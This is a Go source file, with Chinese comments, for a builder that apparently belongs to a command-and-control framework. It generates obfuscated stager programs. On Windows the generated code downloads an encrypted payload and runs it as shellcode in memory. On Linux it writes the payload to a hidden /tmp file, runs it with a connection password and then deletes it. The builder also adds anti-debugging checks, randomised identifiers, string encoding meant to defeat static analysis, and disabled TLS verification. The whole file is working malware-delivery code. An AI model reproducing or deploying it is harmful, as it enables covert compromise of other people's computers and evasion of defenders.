package stager

import (
	"bytes"
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"text/template"
	"time"
)

// StagerConfig 配置结构
type StagerConfig struct {
	DownloadURL string // 下载URL
	UserAgent   string // User-Agent
	Timeout     int    // 超时时间
	Arch        string // 目标架构 (386/amd64)
	OS          string // 目标系统 (windows/linux/darwin)
	AntiDebug   bool   // 反调试
	Obfuscation bool   // 代码混淆
	SleepTime   int    // 随机延时
	MaxRetries  int    // 最大重试次数
	Lightweight bool   // 轻量模式（移除HTTPS支持以减小体积）
	Password    string // 上线密码
	XorKey      int    // Stage XOR 混淆密钥（0=不解密；仅 CryptoMode=xor 时使用）
	AccessToken string // 投递访问令牌（非空时以 X-Delivery-Token 头携带，避免 ?t= 进 URL 日志）
	// 载荷加密：CryptoMode=aead 时，下载到的完整载荷按 AES-256-GCM 解密。
	CryptoMode  string
	DeliveryKey []byte // AEAD 密钥（32 字节）
}

// StagerBuilder 构建器
type StagerBuilder struct {
	config     *StagerConfig
	tempDir    string
	sourceCode string
}

// NewStagerBuilder 创建新的构建器
func NewStagerBuilder(config *StagerConfig) *StagerBuilder {
	return &StagerBuilder{
		config:  config,
		tempDir: filepath.Join(os.TempDir(), fmt.Sprintf("stager_%d", time.Now().UnixNano())),
	}
}

// GenerateVariableNames 生成随机变量名
func (sb *StagerBuilder) GenerateVariableNames() map[string]string {
	vars := map[string]string{
		"URL":       sb.randomString(8),
		"CLIENT":    sb.randomString(10),
		"DATA":      sb.randomString(9),
		"SIZE":      sb.randomString(7),
		"RESP":      sb.randomString(11),
		"ERR":       sb.randomString(6),
		"TIMEOUT":   sb.randomString(12),
		"USERAGENT": sb.randomString(15),
		"SHELLCODE": sb.randomString(13),
		"PTR":       sb.randomString(8),
		"DELAY":     sb.randomString(9),
		"RETRY":     sb.randomString(10),
		"PASSWORD":  sb.randomString(12), // 上线密码变量名
		// 添加函数名混淆
		"DOWNLOAD_FUNC": sb.randomString(11), // 下载函数名
		"EXECUTE_FUNC":  sb.randomString(10), // 执行函数名
	}
	return vars
}

// randomString 生成随机字符串
func (sb *StagerBuilder) randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[sb.randomInt(len(charset))]
	}
	return string(b)
}

// randomInt 生成随机整数
func (sb *StagerBuilder) randomInt(max int) int {
	b := make([]byte, 1)
	rand.Read(b)
	return int(b[0]) % max
}

// strBytesLiteral 将字符串转为 Go 字节数组字面量（逗号分隔十进制），
// 用于模板中 []byte{...} 运行时拼接，规避 strings 直接提取字符串常量。
func strBytesLiteral(s string) string {
	if len(s) == 0 {
		return "0"
	}
	parts := make([]string, len(s))
	for i, c := range []byte(s) {
		parts[i] = strconv.Itoa(int(c))
	}
	return strings.Join(parts, ",")
}

// byteSliceLiteral 将字节切片转为 Go 字节数组字面量。
func byteSliceLiteral(b []byte) string {
	if len(b) == 0 {
		return "0"
	}
	parts := make([]string, len(b))
	for i, c := range b {
		parts[i] = strconv.Itoa(int(c))
	}
	return strings.Join(parts, ",")
}

// GenerateSourceCode 生成源代码
func (sb *StagerBuilder) GenerateSourceCode() error {
	vars := sb.GenerateVariableNames()

	// Windows stager模板（修复版 - 下载完整客户端）
	windowsTemplate := `
// +build windows

package main

import (
	"crypto/tls"
	{{if .AEAD}}"crypto/aes"
	"crypto/cipher"
	{{end}}"io"
	"net/http"
	{{if .AntiDebug}}"os"{{end}}
	"syscall"
	"time"
	"unsafe"
)

const (
	{{.TIMEOUT}} = {{.Timeout}}
	{{.DELAY}} = {{.SleepTime}}
	{{.RETRY}} = {{.MaxRetries}}
)

// URL/UA 以字节数组运行时拼接（规避 strings 直接提取字符串常量）
func {{.randomUrlVar}}() string {
	{{.randomUrlData}} := []byte{ {{.UrlBytes}} }
	return string({{.randomUrlData}})
}
func {{.randomUaVar}}() string {
	{{.randomUaData}} := []byte{ {{.UaBytes}} }
	return string({{.randomUaData}})
}

{{if .AEAD}}
// AES-256-GCM 解密（nonce || ciphertext || tag）
func {{.randomAEADFunc}}(data []byte, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil || len(data) < gcm.NonceSize() {
		return nil
	}
	out, err := gcm.Open(nil, data[:gcm.NonceSize()], data[gcm.NonceSize():], nil)
	if err != nil {
		return nil
	}
	return out
}
{{end}}

{{if gt .XorKey 0}}
// XOR 还原载荷（与投递端 XorKey 一致，单字节异或）
func {{.randomXorFunc}}({{.randomXorArg}} []byte) {
	for i := range {{.randomXorArg}} {
		{{.randomXorArg}}[i] ^= {{.XorKey}}
	}
}
{{end}}

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc = kernel32.NewProc("VirtualAlloc")
	procVirtualProtect = kernel32.NewProc("VirtualProtect")
	procCreateThread = kernel32.NewProc("CreateThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procGetProcAddress = kernel32.NewProc("GetProcAddress")
	procGetModuleHandle = kernel32.NewProc("GetModuleHandleW")
)

{{if .AntiDebug}}
func {{.randomFunc1}}() bool {
	ret, _, _ := procGetModuleHandle.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("kernel32.dll"))))
	if ret == 0 {
		return true
	}
	
	proc, _, _ := procGetProcAddress.Call(ret, uintptr(unsafe.Pointer(&[]byte("IsDebuggerPresent\x00")[0])))
	if proc == 0 {
		return false
	}
	
	r1, _, _ := syscall.Syscall(proc, 0, 0, 0, 0)
	return r1 != 0
}

func {{.randomFunc2}}() {
	if {{.randomFunc1}}() {
		os.Exit(0)
	}
}
{{end}}

{{if .Obfuscation}}
// 混淆函数名
func {{.randomFunc5}}() []byte {
{{else}}
func {{.randomFunc3}}() []byte {
{{end}}
	{{if .AntiDebug}}{{.randomFunc2}}(){{end}}
	
	// 简单延时 - 使用监听器心跳间隔
	time.Sleep({{.DELAY}} * time.Second)
	
	for {{.randomVar3}} := 0; {{.randomVar3}} != {{.RETRY}}; {{.randomVar3}}++ {
		{{.CLIENT}} := &http.Client{
			Timeout: time.Duration({{.TIMEOUT}}) * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		
		{{.randomVar4}}, {{.ERR}} := http.NewRequest("GET", {{.randomUrlVar}}(), nil)
		if {{.ERR}} != nil {
			continue
		}
		
		{{.randomVar4}}.Header.Set("User-Agent", {{.randomUaVar}}())
		{{if .HasAccessToken}}{{.randomVar4}}.Header.Set("X-Delivery-Token", {{.AccessToken}}){{end}}
		
		{{.RESP}}, {{.ERR}} := {{.CLIENT}}.Do({{.randomVar4}})
		if {{.ERR}} != nil {
			time.Sleep(3 * time.Second)
			continue
		}
		defer {{.RESP}}.Body.Close()
		
		if {{.RESP}}.StatusCode == 200 {
			{{.DATA}}, {{.ERR}} := io.ReadAll({{.RESP}}.Body)
			if {{.ERR}} == nil && len({{.DATA}}) != 0 {
				return {{.DATA}}
			}
		}
		
		time.Sleep(2 * time.Second)
	}
	return nil
}

{{if .Obfuscation}}
// 混淆函数名 - 直接执行shellcode
func {{.randomFunc6}}({{.SHELLCODE}} []byte) {
{{else}}
// 直接执行shellcode
func {{.randomFunc4}}({{.SHELLCODE}} []byte) {
{{end}}
	{{if .AntiDebug}}{{.randomFunc2}}(){{end}}
	
	{{.SIZE}} := uintptr(len({{.SHELLCODE}}))
	
	{{.PTR}}, _, _ := procVirtualAlloc.Call(0, {{.SIZE}}, 0x3000, 0x40)
	if {{.PTR}} == 0 {
		return
	}
	
	{{.randomVar8}} := (*[1024000000]byte)(unsafe.Pointer({{.PTR}}))
	copy({{.randomVar8}}[:{{.SIZE}}], {{.SHELLCODE}})
	
	var {{.randomVar9}} uint32
	procVirtualProtect.Call({{.PTR}}, {{.SIZE}}, 0x20, uintptr(unsafe.Pointer(&{{.randomVar9}})))
	
	{{.randomVar10}}, _, _ := procCreateThread.Call(0, 0, {{.PTR}}, 0, 0, 0)
	if {{.randomVar10}} != 0 {
		procWaitForSingleObject.Call({{.randomVar10}}, 0xFFFFFFFF)
	}
}

func main() {
	{{if .AntiDebug}}{{.randomFunc2}}(){{end}}
	
	{{.DATA}} := {{if .Obfuscation}}{{.randomFunc5}}(){{else}}{{.randomFunc3}}(){{end}}
	if {{.DATA}} != nil {
		{{if .AEAD}}{{.DATA}} = {{.randomAEADFunc}}({{.DATA}}, []byte{ {{.DeliveryKeyBytes}} }); if {{.DATA}} == nil { return }{{end}}
		{{if gt .XorKey 0}}{{.randomXorFunc}}({{.DATA}}){{end}}
		{{if .Obfuscation}}{{.randomFunc6}}({{.DATA}}){{else}}{{.randomFunc4}}({{.DATA}}){{end}}
	}
}
`

	// Linux stager模板 - 写入磁盘执行版本，参数从监听器动态获取，只混淆变量名
	linuxTemplate := `
package main

import (
	"crypto/tls"
	{{if .AEAD}}"crypto/aes"
	"crypto/cipher"
	{{end}}"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"
)

const (
	{{.TIMEOUT}} = {{.Timeout}}
	{{.DELAY}} = {{.SleepTime}}
	{{.RETRY}} = {{.MaxRetries}}
	{{.PASSWORD}} = {{.Password}} // 上线密码（注入值已含引号）
)

// URL/UA 以字节数组运行时拼接（规避 strings 直接提取字符串常量）
func {{if .Obfuscation}}{{.randomUrlVar}}{{else}}getUrl{{end}}() string {
	{{if .Obfuscation}}{{.randomUrlData}}{{else}}ub{{end}} := []byte{ {{.UrlBytes}} }
	return string({{if .Obfuscation}}{{.randomUrlData}}{{else}}ub{{end}})
}
func {{if .Obfuscation}}{{.randomUaVar}}{{else}}getUA{{end}}() string {
	{{if .Obfuscation}}{{.randomUaData}}{{else}}uab{{end}} := []byte{ {{.UaBytes}} }
	return string({{if .Obfuscation}}{{.randomUaData}}{{else}}uab{{end}})
}

{{if .AEAD}}
// AES-256-GCM 解密（nonce || ciphertext || tag）
func {{.randomAEADFunc}}(data []byte, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil || len(data) < gcm.NonceSize() {
		return nil
	}
	out, err := gcm.Open(nil, data[:gcm.NonceSize()], data[gcm.NonceSize():], nil)
	if err != nil {
		return nil
	}
	return out
}
{{end}}

{{if gt .XorKey 0}}
// XOR 还原载荷（与投递端 XorKey 一致）
func {{if .Obfuscation}}{{.randomXorFunc}}{{else}}xorDecode{{end}}({{if .Obfuscation}}{{.randomXorArg}}{{else}}d{{end}} []byte) {
	for i := range {{if .Obfuscation}}{{.randomXorArg}}{{else}}d{{end}} {
		{{if .Obfuscation}}{{.randomXorArg}}{{else}}d{{end}}[i] ^= {{.XorKey}}
	}
}
{{end}}

func {{if .Obfuscation}}{{.DOWNLOAD_FUNC}}{{else}}downloadFunc{{end}}() []byte {
	{{if .Obfuscation}}{{.randomVar1}}{{else}}delayTime{{end}} := rand.Intn({{.DELAY}})
	if {{if .Obfuscation}}{{.randomVar1}}{{else}}delayTime{{end}} == 0 {
		{{if .Obfuscation}}{{.randomVar1}}{{else}}delayTime{{end}} = 1
	}
	time.Sleep(time.Duration({{if .Obfuscation}}{{.randomVar1}}{{else}}delayTime{{end}}) * time.Second)
	
	for {{if .Obfuscation}}{{.randomVar2}}{{else}}i{{end}} := 0; {{if .Obfuscation}}{{.randomVar2}}{{else}}i{{end}} != {{.RETRY}}; {{if .Obfuscation}}{{.randomVar2}}{{else}}i{{end}}++ {
		{{if .Obfuscation}}{{.randomVar3}}{{else}}client{{end}} := &http.Client{
			Timeout: time.Duration({{.TIMEOUT}}) * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		
		{{if .Obfuscation}}{{.randomVar4}}, {{.randomVar5}}{{else}}req, err{{end}} := http.NewRequest("GET", {{if .Obfuscation}}{{.randomUrlVar}}{{else}}getUrl{{end}}(), nil)
		if {{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} != nil {
			continue
		}
		
		{{if .Obfuscation}}{{.randomVar4}}{{else}}req{{end}}.Header.Set("User-Agent", {{if .Obfuscation}}{{.randomUaVar}}{{else}}getUA{{end}}())
		{{if .HasAccessToken}}{{if .Obfuscation}}{{.randomVar4}}{{else}}req{{end}}.Header.Set("X-Delivery-Token", {{.AccessToken}}){{end}}
		
		{{if .Obfuscation}}{{.randomVar6}}, {{.randomVar5}}{{else}}resp, err{{end}} := {{if .Obfuscation}}{{.randomVar3}}{{else}}client{{end}}.Do({{if .Obfuscation}}{{.randomVar4}}{{else}}req{{end}})
		if {{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} != nil {
			time.Sleep(6 * time.Second)
			continue
		}
		defer {{if .Obfuscation}}{{.randomVar6}}{{else}}resp{{end}}.Body.Close()
		
		if {{if .Obfuscation}}{{.randomVar6}}{{else}}resp{{end}}.StatusCode == 200 {
			{{if .Obfuscation}}{{.randomVar7}}, {{.randomVar5}}{{else}}data, err{{end}} := io.ReadAll({{if .Obfuscation}}{{.randomVar6}}{{else}}resp{{end}}.Body)
			if {{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} == nil && len({{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}}) != 0 {
				return {{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}}
			}
		}
		
		time.Sleep(3 * time.Second)
	}
	return nil
}

func {{if .Obfuscation}}{{.EXECUTE_FUNC}}{{else}}executeFunc{{end}}(data []byte) *sync.WaitGroup {
	{{if .Obfuscation}}{{.randomVar9}}{{else}}tempFile{{end}} := fmt.Sprintf("/tmp/.unix_%d", time.Now().UnixNano())
	
	{{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} := os.WriteFile({{if .Obfuscation}}{{.randomVar9}}{{else}}tempFile{{end}}, data, 0755)
	if {{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} != nil {
		{{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}} := &sync.WaitGroup{}
		return {{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}}
	}
	
	{{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} = os.Chmod({{if .Obfuscation}}{{.randomVar9}}{{else}}tempFile{{end}}, 0755)
	if {{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} != nil {
		os.Remove({{if .Obfuscation}}{{.randomVar9}}{{else}}tempFile{{end}})
		{{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}} := &sync.WaitGroup{}
		return {{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}}
	}
	
	// 启动清理goroutine - 延迟删除临时文件
	{{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}} := &sync.WaitGroup{}
	{{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}}.Add(1)
	go func() {
		defer {{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}}.Done()
		time.Sleep(10 * time.Second)
		os.Remove({{if .Obfuscation}}{{.randomVar9}}{{else}}tempFile{{end}})
	}()
	
	{{if .Obfuscation}}{{.randomVar11}}{{else}}cmd{{end}} := exec.Command({{if .Obfuscation}}{{.randomVar9}}{{else}}tempFile{{end}}, {{.PASSWORD}})
	{{if .Obfuscation}}{{.randomVar11}}{{else}}cmd{{end}}.Env = os.Environ()
	
	{{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} = {{if .Obfuscation}}{{.randomVar11}}{{else}}cmd{{end}}.Start()
	if {{if .Obfuscation}}{{.randomVar5}}{{else}}err{{end}} != nil {
		os.Remove({{if .Obfuscation}}{{.randomVar9}}{{else}}tempFile{{end}})
		{{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}} := &sync.WaitGroup{}
		return {{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}}
	}
	
	return {{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}}
}

func main() {
	runtime.GOMAXPROCS(1)
	rand.Seed(time.Now().UnixNano())
	
	{{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}} := {{if .Obfuscation}}{{.DOWNLOAD_FUNC}}{{else}}downloadFunc{{end}}()
	if {{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}} != nil {
		{{if .AEAD}}{{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}} = {{.randomAEADFunc}}({{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}}, []byte{ {{.DeliveryKeyBytes}} }); if {{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}} == nil { return }{{end}}
		{{if gt .XorKey 0}}{{if .Obfuscation}}{{.randomXorFunc}}{{else}}xorDecode{{end}}({{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}}){{end}}
		{{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}} := {{if .Obfuscation}}{{.EXECUTE_FUNC}}{{else}}executeFunc{{end}}({{if .Obfuscation}}{{.randomVar7}}{{else}}data{{end}})
		{{if .Obfuscation}}{{.randomVar10}}{{else}}wg{{end}}.Wait()
	}
}
`

	// 选择对应平台的模板
	var templateStr string
	switch sb.config.OS {
	case "windows":
		templateStr = windowsTemplate
	case "linux":
		templateStr = linuxTemplate
	default:
		return fmt.Errorf("unsupported OS: %s", sb.config.OS)
	}

	// 生成随机函数名和变量名
	funcVars := map[string]string{
		"randomFunc1":    sb.randomString(12),
		"randomFunc2":    sb.randomString(11),
		"randomFunc3":    sb.randomString(13),
		"randomFunc4":    sb.randomString(10),
		"randomFunc5":    sb.randomString(14), // 混淆专用
		"randomFunc6":    sb.randomString(15), // 混淆专用
		"randomVar1":     sb.randomString(8),
		"randomVar2":     sb.randomString(9),
		"randomVar3":     sb.randomString(7),
		"randomVar4":     sb.randomString(10),
		"randomVar5":     sb.randomString(8), // 通用err变量
		"randomVar6":     sb.randomString(9),
		"randomVar7":     sb.randomString(11), // data变量
		"randomVar8":     sb.randomString(12), // 函数参数
		"randomVar9":     sb.randomString(10), // size变量
		"randomVar10":    sb.randomString(13), // tempFile变量
		"randomVar11":    sb.randomString(7),  // done变量
		"randomVar12":    sb.randomString(8),  // cleanupDone变量
		"randomVar13":    sb.randomString(9),  // cmd变量
		"randomString1":  sb.randomString(8),  // Linux专用：临时文件前缀
		"randomXorFunc":  sb.randomString(10), // XOR 解密函数名
		"randomXorArg":   sb.randomString(8),  // XOR 解密参数名
		"randomAEADFunc": sb.randomString(12), // AEAD 解密函数名
		"randomUrlVar":   sb.randomString(8),  // URL 构造函数名
		"randomUrlData":  sb.randomString(7),  // URL 字节数组变量
		"randomUaVar":    sb.randomString(9),  // UA 构造函数名
		"randomUaData":   sb.randomString(8),  // UA 字节数组变量
	}

	// 合并所有变量
	allVars := make(map[string]interface{})
	for k, v := range vars {
		allVars[k] = v
	}
	for k, v := range funcVars {
		allVars[k] = v
	}
	// AEAD 与单字节 XOR 互斥；显式 none 也不能再按旧 XorKey 解密（否则会把明文再 XOR 坏）。
	mode := strings.ToLower(strings.TrimSpace(sb.config.CryptoMode))
	xorKey := sb.config.XorKey
	if mode == "aead" || mode == "none" {
		xorKey = 0
	}
	for k, v := range map[string]interface{}{
		// D44: 字符串值经 strconv.Quote 转义后注入模板，防止 " 或 \ 破坏生成源码 / 注入任意 Go 代码
		"DownloadURL":      strconv.Quote(sb.config.DownloadURL),
		"UserAgent":        strconv.Quote(sb.config.UserAgent),
		"Timeout":          sb.config.Timeout,
		"SleepTime":        sb.config.SleepTime,
		"MaxRetries":       sb.config.MaxRetries,
		"AntiDebug":        sb.config.AntiDebug,
		"Obfuscation":      sb.config.Obfuscation,
		"Password":         strconv.Quote(sb.config.Password), // 添加密码字段
		"XorKey":           xorKey,                            // Stage XOR 混淆密钥（AEAD 模式下强制 0）
		"HasAccessToken":   sb.config.AccessToken != "",
		"AccessToken":      strconv.Quote(sb.config.AccessToken), // 投递访问令牌（Header 传递）
		"AEAD":             strings.EqualFold(sb.config.CryptoMode, "aead") && len(sb.config.DeliveryKey) == 32,
		"DeliveryKeyBytes": byteSliceLiteral(sb.config.DeliveryKey),
		// URL/UA 转字节数组字面量（如 104,116,116,112,...），模板中以 []byte{...} 拼接，
		// 规避 strings 命令直接提取下载地址/UA 字符串
		"UrlBytes": strBytesLiteral(sb.config.DownloadURL),
		"UaBytes":  strBytesLiteral(sb.config.UserAgent),
	} {
		allVars[k] = v
	}

	tmpl, err := template.New("stager").Parse(templateStr)
	if err != nil {
		return err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, allVars); err != nil {
		return err
	}

	sb.sourceCode = buf.String()
	return nil
}

// Build 编译stager
func (sb *StagerBuilder) Build() ([]byte, error) {
	// 创建临时目录
	if err := os.MkdirAll(sb.tempDir, 0755); err != nil {
		return nil, err
	}
	defer os.RemoveAll(sb.tempDir)

	// 生成源代码
	if err := sb.GenerateSourceCode(); err != nil {
		return nil, err
	}

	// 写入源文件
	sourceFile := filepath.Join(sb.tempDir, "main.go")
	if err := os.WriteFile(sourceFile, []byte(sb.sourceCode), 0644); err != nil {
		return nil, err
	}

	// 构建参数
	var outputFile string
	buildArgs := []string{"build"}

	// 设置编译参数
	if sb.config.OS == "windows" {
		// 更激进的体积优化参数
		buildArgs = append(buildArgs, "-ldflags", "-s -w -H windowsgui -extldflags=-static")
	} else {
		buildArgs = append(buildArgs, "-ldflags", "-s -w -extldflags=-static")
	}
	buildArgs = append(buildArgs, "-trimpath") // 去除路径信息
	buildArgs = append(buildArgs, "-a")        // 强制重新编译所有包

	if sb.config.OS == "windows" {
		outputFile = filepath.Join(sb.tempDir, "stager.exe")
		buildArgs = append(buildArgs, "-o", outputFile)
	} else {
		outputFile = filepath.Join(sb.tempDir, "stager")
		buildArgs = append(buildArgs, "-o", outputFile)
	}

	buildArgs = append(buildArgs, sourceFile)

	// 设置环境变量
	env := os.Environ()
	env = append(env, fmt.Sprintf("GOOS=%s", sb.config.OS))

	// 架构映射：x64 -> amd64, x86 -> 386
	goArch := sb.config.Arch
	if goArch == "x64" {
		goArch = "amd64"
	} else if goArch == "x86" {
		goArch = "386"
	}
	env = append(env, fmt.Sprintf("GOARCH=%s", goArch))
	env = append(env, "CGO_ENABLED=0")

	// 检查 go 工具链是否可用
	if _, err := exec.LookPath("go"); err != nil {
		return nil, fmt.Errorf("动态 Stager 需要服务端安装 Go 工具链并加入 PATH（go 命令未找到）: %v", err)
	}

	// 执行编译
	cmd := exec.Command("go", buildArgs...)
	cmd.Env = env
	cmd.Dir = sb.tempDir

	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("动态 Stager 编译失败（请确认服务端已安装 Go 且支持 GOOS=%s GOARCH=%s）: %s\nOutput: %s",
			sb.config.OS, goArch, err, string(output))
	}

	// 读取编译结果
	binaryData, err := os.ReadFile(outputFile)
	if err != nil {
		return nil, err
	}

	return binaryData, nil
}

// GetSourceHash 获取源代码哈希值
func (sb *StagerBuilder) GetSourceHash() string {
	hash := md5.Sum([]byte(sb.sourceCode))
	return hex.EncodeToString(hash[:])
}

// GetSourceCode 获取生成的源代码
func (sb *StagerBuilder) GetSourceCode() string {
	return sb.sourceCode
}
